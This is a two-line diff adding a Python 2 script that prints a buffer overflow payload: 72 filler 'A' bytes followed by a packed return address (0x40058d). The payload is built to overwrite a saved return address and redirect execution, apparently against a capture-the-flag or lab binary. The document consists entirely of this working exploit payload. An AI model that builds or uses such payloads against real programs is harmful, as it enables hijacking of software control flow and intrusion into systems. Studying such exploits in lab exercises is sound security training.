@@ -1,0 +1,2 @@
+#!/usr/bin/python
+print 'A' * 72 + '\x8d\x05\x40\x00'
